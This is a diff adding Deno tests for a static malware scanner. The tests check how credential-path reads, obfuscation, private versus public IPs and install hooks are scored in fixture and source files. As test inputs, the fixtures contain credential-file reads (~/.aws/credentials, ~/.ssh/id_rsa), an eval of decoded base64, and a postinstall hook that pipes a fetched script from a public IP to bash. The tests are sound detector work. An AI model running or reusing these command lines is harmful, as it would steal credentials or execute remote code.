@@ -365,3 +365,170 @@ Deno.test("embedded-secret / network literals in docs are prose too (systemic do
     "doc-side matches must still be surfaced as regions for the model",
   );
 });
+
+// ─────────────────────────────────────────────────────────────────────────────
+// TEST-FIXTURE / SECURITY-TOOLING context (the security-tooling false-positive
+// fix). A credential-PATH reference inside a genuine test/fixture/example file is
+// a self-contained simulation, not a runtime credential theft, and must NOT set
+// the -40 credAccess signal — UNLESS the same file also shows a harder tell
+// (obfuscation / embedded live secret), which keeps full weight so a real attack
+// cannot hide behind a "fixture" filename. Both directions are asserted.
+// ─────────────────────────────────────────────────────────────────────────────
+
+Deno.test("credential-path read inside a *-fixture file is region-only, NOT a credAccess signal (Direction A)", () => {
+  // Arrange — the exact shape of this product's own exfil-fixture.py: a disclosed
+  // attack SIMULATION that reads ~/.aws/credentials. No obfuscation, no live secret.
+  const fixture = file(
+    "sandbox/microvm/forge/exfil-fixture.py",
+    [
+      "import os",
+      'CRED_PATHS = ["/root/.aws/credentials", os.path.expanduser("~/.aws/credentials")]',
+      "def run():",
+      "    for p in CRED_PATHS:",
+      "        if os.path.exists(p):",
+      "            creds = open(p).read()",
+    ].join("\n"),
+  );
+
+  // Act
+  const result = staticScan([fixture]);
+
+  // Assert — the -40 credential-access signal does NOT fire on a disclosed fixture…
+  assertEquals(result.signals.credAccess, false, "a credential-path read in a *-fixture file must not set credAccess");
+  assertEquals(result.severityHint, "clean", "a disclosed test fixture must not read as high-severity");
+  // …but the finding is still surfaced as a region, honestly tagged as fixture context.
+  assert(
+    result.flaggedRegions.some((r) => /test-fixture context/.test(r.reason)),
+    "the credential-path region must still be surfaced with test-fixture context for the model",
+  );
+});
+
+Deno.test("the SAME credential-path read in a normal source file DOES set credAccess (no blanket downgrade)", () => {
+  // Arrange — identical content, but NOT a test/fixture/example path.
+  const source = file(
+    "src/collect.py",
+    [
+      "import os",
+      'CRED_PATHS = ["/root/.aws/credentials", os.path.expanduser("~/.aws/credentials")]',
+      "def run():",
+      "    creds = open(CRED_PATHS[0]).read()",
+    ].join("\n"),
+  );
+
+  // Act
+  const result = staticScan([source]);
+
+  // Assert — real runtime credential access in shipped source keeps full weight.
+  assertEquals(result.signals.credAccess, true, "credential access in normal source must set credAccess");
+  assertEquals(result.severityHint, "high");
+});
+
+Deno.test("obfuscation in a *-fixture file is NEVER downgraded, and it keeps credAccess at full weight too (Direction B)", () => {
+  // Arrange — a real attack wearing a fixture filename: reads an SSH key AND hides
+  // an eval-of-decoded payload. The "fixture" label must not save it.
+  const fakeFixture = file(
+    "tests/payment-fixture.js",
+    [
+      "const fs = require('fs');",
+      "const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');",
+      "eval(atob('dmFyIHg9MTs='));",
+    ].join("\n"),
+  );
+
+  // Act
+  const result = staticScan([fakeFixture]);
+
+  // Assert — obfuscation always fires; and because a harder tell is present in the
+  // same file, the credential-path signal is NOT downgraded either.
+  assertEquals(result.signals.obfuscation, true, "obfuscation is never softened by a fixture path");
+  assertEquals(result.signals.credAccess, true, "credAccess keeps full weight when the fixture file is also obfuscated");
+  assertEquals(result.severityHint, "high");
+});
+
+Deno.test("an embedded live private key in a *-fixture file keeps credAccess at full weight", () => {
+  // Arrange — a committed private key is a real leaked secret regardless of a
+  // "fixture" filename, so the fixture downgrade must not apply to credAccess here.
+  const fixtureWithKey = file(
+    "tests/fixtures/creds.spec.js",
+    [
+      "const key = `-----BEGIN OPENSSH PRIVATE KEY-----`;",
+      "const p = require('os').homedir() + '/.ssh/id_rsa';",
+    ].join("\n"),
+  );
+
+  // Act
+  const result = staticScan([fixtureWithKey]);
+
+  // Assert — embedded secret fires, and credAccess is NOT downgraded next to it.
+  assertEquals(result.signals.embeddedSecret, true, "an embedded private key always fires embeddedSecret");
+  assertEquals(result.signals.credAccess, true, "credAccess keeps full weight when a live secret is embedded in the same fixture");
+});
+
+Deno.test("test-fixture classification is anchored: 'latest'/'attestation' are NOT fixtures", () => {
+  // Arrange — filenames/paths that merely CONTAIN 'test' as a substring must not be
+  // mistaken for test files, or the downgrade would over-apply to shipped source.
+  const notFixtureA = file(
+    "src/latest.ts",
+    'const p = require("os").homedir() + "/.aws/credentials"; open(p);',
+  );
+  const notFixtureB = file(
+    "src/attestation/verify.ts",
+    'const p = require("os").homedir() + "/.aws/credentials"; open(p);',
+  );
+
+  // Act + Assert — both keep full credential-access weight (not downgraded).
+  assertEquals(staticScan([notFixtureA]).signals.credAccess, true, "'latest.ts' must not be treated as a test file");
+  assertEquals(staticScan([notFixtureB]).signals.credAccess, true, "'src/attestation/...' must not be treated as a test dir");
+});
+
+// ─────────────────────────────────────────────────────────────────────────────
+// PRIVATE-IP + INSTALL-CONTEXT precision (the infra/security-tooling false-positive
+// that scored this product's OWN repo "Malicious" via install-time network). A
+// private/loopback IP is internal infra, never egress; and a standalone provisioning
+// script is not the auto-run install-time-exfil vector a lifecycle hook is.
+// ─────────────────────────────────────────────────────────────────────────────
+
+Deno.test("a loopback/private IP is internal infra, NOT network egress", () => {
+  // A localhost health check + an RFC1918 gateway reference — both internal.
+  const infra = file(
+    "provision-forge-gateway.sh",
+    "#!/usr/bin/env bash\ncurl -fsS http://127.0.0.1:8090/healthz\niptables -A FORWARD -d 10.200.0.10 -j ACCEPT\n",
+  );
+  const result = staticScan([infra]);
+  assertEquals(result.signals.network, false, "a loopback/private IP must not set the network signal");
+  assertEquals(result.installTimeNetwork, false, "a loopback IP in an infra script must not set installTimeNetwork");
+  assertEquals(result.severityHint, "clean");
+  // Still surfaced as a region, honestly labeled as internal.
+  assert(
+    result.flaggedRegions.some((r) => /internal\/loopback address/.test(r.reason)),
+    "the internal IP must still be surfaced as a region, labeled internal",
+  );
+});
+
+Deno.test("a PUBLIC hardcoded IP still sets the network signal", () => {
+  const pub = file("client.js", "fetch('http://203.0.113.9/collect')");
+  const result = staticScan([pub]);
+  assertEquals(result.signals.network, true, "a public hardcoded IP must still be a network signal");
+});
+
+Deno.test("a standalone provisioning script is NOT install-time (only lifecycle-named scripts are)", () => {
+  // forge-up.sh does a DNS reachability probe to a public resolver. It is a script a
+  // human runs deliberately, NOT an auto-running install hook — so it is general network
+  // capability (-6-worthy), not the -40 install-time-exfil signal.
+  const provisioning = file(
+    "forge-up.sh",
+    "#!/usr/bin/env bash\nnc -z 8.8.8.8 53 || echo 'no DNS'\ncurl -fsSL https://deb.nodesource.com/setup | bash\n",
+  );
+  const result = staticScan([provisioning]);
+  assertEquals(result.installTimeNetworkHard, false, "a standalone provisioning script must not be install-time-hard");
+  assertEquals(result.installTimeNetwork, false, "…and must not set installTimeNetwork on its own");
+});
+
+Deno.test("an ACTUAL install hook with a public-IP fetch STILL keeps full install-time weight (no weakening)", () => {
+  // The narrowing must not soften the real vector: a postinstall.sh that fetches a raw
+  // public IP is exactly the auto-run install-time exfil this signal exists for.
+  const hook = file("postinstall.sh", "curl http://203.0.113.9:4444/stage2.sh | bash\n");
+  const result = staticScan([hook]);
+  assertEquals(result.installTimeNetwork, true, "a real install hook fetching a public IP must keep full weight");
+  assertEquals(result.severityHint, "medium");
+});
